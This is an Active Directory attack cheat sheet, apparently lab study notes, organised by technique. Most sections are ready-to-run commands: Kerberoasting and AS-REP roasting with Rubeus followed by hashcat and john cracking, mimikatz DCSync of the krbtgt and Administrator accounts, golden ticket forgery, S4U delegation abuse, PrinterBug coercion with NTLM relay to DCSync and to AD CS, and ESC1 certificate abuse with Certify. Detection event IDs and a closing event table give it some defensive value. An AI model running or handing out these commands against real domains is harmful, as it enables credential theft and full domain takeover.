## Kerberoasting

Request TGS tickets for SPN-configured accounts and crack them offline. Detectable via Event ID 4769.

### Attack

```powershell
.\Rubeus.exe kerberoast /outfile:spn.txt
```

### Crack

```bash
hashcat -m 13100 -a 0 spn.txt passwords.txt
sudo john spn.txt --fork=4 --format=krb5tgs --wordlist=passwords.txt --pot=results.pot
```

---

## ASREPRoasting

Find accounts with Kerberos pre-auth disabled and request their AS-REP hash. Detectable via Event ID 4768.

### Attack

```powershell
.\Rubeus.exe asreproast /outfile:asrep.txt
```

### Crack

```bash
hashcat -m 18200 -a 0 asrep.txt passwords.txt --force
```

---

## GPP Passwords

Group Policy Preferences stored credentials in SYSVOL. Passwords were encrypted with a publicly-known AES key.

### Import and Run Get-GPPPassword

```powershell
Set-ExecutionPolicy Unrestricted -Scope CurrentUser
Import-Module .\Get-GPPPassword.ps1
Get-GPPPassword
```

---

## Credentials in Shares

Search shares for sensitive files containing credentials.

### Find Shares

```powershell
Import-Module .\PowerView.ps1
Invoke-ShareFinder -domain <domain> -ExcludeStandard -CheckShareAccess
```

### Search for Keywords in Files

```cmd
findstr /m /s /i "eagle" *.ps1
```

---

## Credentials in Object Properties

Passwords are often stored in the Description or Info fields of AD user objects.

### Search User Description/Info Fields

```powershell
.\SearchUser.ps1 -Terms pass
Get-DomainUser * | Select-Object samaccountname,description
```

---

## DCSync

Replicate AD data as if you were a domain controller. Requires DS-Replication-Get-Changes-All rights. Detectable via Event ID 4662.

### Run as a Different User

```cmd
runas /user:<domain>\<username> cmd.exe
```

### DCSync with Mimikatz

```powershell
mimikatz.exe
lsadump::dcsync /domain:<domain> /user:Administrator
lsadump::dcsync /domain:<domain> /user:krbtgt
```

---

## Golden Ticket

Forge a TGT using the KRBTGT hash. Provides persistent access. Requires KRBTGT hash and domain SID.

### Get KRBTGT Hash

```powershell
lsadump::dcsync /domain:<domain> /user:krbtgt
```

### Get Domain SID

```powershell
Get-DomainSID
```

### Forge and Inject Golden Ticket

```powershell
golden /domain:<domain> /sid:<domain-sid> /rc4:<krbtgt-hash> /user:Administrator /id:500 /renewmax:7 /endin:8 /ptt
klist
```

---

## Kerberos Constrained Delegation

If a service account is trusted for delegation to specific services, request a ticket for any user to those services.

### Find Accounts Trusted for Delegation

```powershell
Get-NetUser -TrustedToAuth
```

### Convert Password to Hash

```powershell
.\Rubeus.exe hash /password:<password>
```

### S4U Attack

```powershell
.\Rubeus.exe s4u /user:<service-account> /rc4:<hash> /domain:<domain> /impersonateuser:Administrator /msdsspn:"http/<dc-hostname>" /dc:<dc-hostname>.<domain> /ptt
Enter-PSSession <dc-hostname>
```

---

## Print Spooler & NTLM Relaying

Coerce DC authentication via the Print Spooler service and relay to DCSync.

### Setup NTLM Relay to DCSync

```bash
impacket-ntlmrelayx -t dcsync://<target-dc-ip> -smb2support
```

### Trigger PrinterBug (dementor.py)

```bash
python3 ./dementor.py <attacker-ip> <target-dc-ip> -u <username> -d <domain> -p <password>
```

### Defense - Disable Print Spooler Remote RPC

```
RegisterSpoolerRemoteRpcEndPoint (disable via registry)
```

---

## Coercing Attacks & Unconstrained Delegation

Combine a coercion attack with a host configured for unconstrained delegation to steal TGTs deposited by the DC.

### Find Unconstrained Delegation Hosts

```powershell
Get-NetComputer -Unconstrained | select samaccountname
```

### Monitor for Incoming TGTs

```powershell
.\Rubeus.exe monitor /interval:1
```

### Coerce DC Authentication

```bash
Coercer -u <username> -p <password> -d <domain> -l <unconstrained-host>.<domain> -t <target-dc>.<domain>
```

### DCSync After Capturing DC TGT

```powershell
mimikatz # lsadump::dcsync /domain:<DOMAIN> /user:<DOMAIN>\administrator
```

---

## Object ACL Abuse

Abuse misconfigured ACEs on AD objects. Modifying SPNs enables targeted Kerberoasting.

### Manipulate SPNs for Targeted Kerberoasting

```cmd
setspn -D http/ws001 anni
setspn -U -s ldap/ws001 anni
setspn -S ldap/server02 server01
```

---

## PKI - ESC1 (Certificate Template Privilege Escalation)

If a certificate template allows requestor-specified Subject Alternative Names (SANs) and grants enroll permissions to low-privilege users, request a certificate for any account including Administrator.

### Find Vulnerable Templates

```powershell
.\Certify.exe find /vulnerable
```

### Request Certificate with Admin UPN

```powershell
.\Certify.exe request /ca:PKI.<domain>\<domain>-PKI-CA /template:UserCert /altname:Administrator
```

### Convert PEM to PFX

```bash
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

### Request TGT with Certificate

```powershell
.\Rubeus.exe asktgt /domain:<domain> /user:Administrator /certificate:cert.pfx /dc:<dc-hostname>.<domain> /ptt
```

### Remote into PKI Server for Event Review

```powershell
runas /user:<domain>\<username> powershell
New-PSSession PKI
Enter-PSSession PKI
```

### View Certificate Events

```powershell
Get-WinEvent -FilterHashtable @{Logname='Security'; ID='4887'}
$events = Get-WinEvent -FilterHashtable @{Logname='Security'; ID='4886'}
$events[0] | Format-List -Property *
```

---

## PKI & Coercing - ESC8 (NTLM Relay to AD CS)

Relay the DC machine account's NTLM authentication to the CA HTTP enrollment endpoint to obtain a DC certificate.

### Setup Relay to CA

```bash
impacket-ntlmrelayx -t http://<ca-ip>/certsrv/default.asp --template DomainController -smb2support --adcs
```

### Trigger PrinterBug to Coerce DC Auth

```bash
python3 ./dementor.py <attacker-ip> <dc2-ip> -u <username> -d <domain> -p <password>
```

### Connect to WS001 for RDP

```bash
xfreerdp /u:<username> /p:<password> /v:<ws-ip> /dynamic-resolution
```

### Use Certificate to Get TGT for DC

```powershell
.\Rubeus.exe asktgt /user:DC2$ /ptt /certificate:<base64-certificate>
```

### DCSync After Obtaining DC TGT

```powershell
mimikatz.exe "lsadump::dcsync /user:Administrator" exit
```

### Connect to PKI with evil-winrm

```bash
evil-winrm -i <pki-ip> -u <username> -p '<password>'
```

---

## Windows Event IDs Reference

| Event ID | Description |
|---|---|
| 4769 | TGS requested - potential Kerberoasting indicator |
| 4768 | TGT requested - potential ASREPRoasting indicator |
| 4625 | Account failed to log on |
| 4771 | Kerberos pre-authentication failure |
| 4776 | Credential validation attempt (NTLM) |
| 5136 | GPO modified (requires Directory Service Changes auditing) |
| 4725 | User account disabled |
| 4624 | Successful logon - S4U extension indicates delegation |
| 4662 | Possible DCSync - flag if account is not a DC |
| 4738 | User account changed - alert on honeypot user changes |
| 4742 | Computer account changed |
| 4886 | Certificate requested |
| 4887 | Certificate approved and issued |
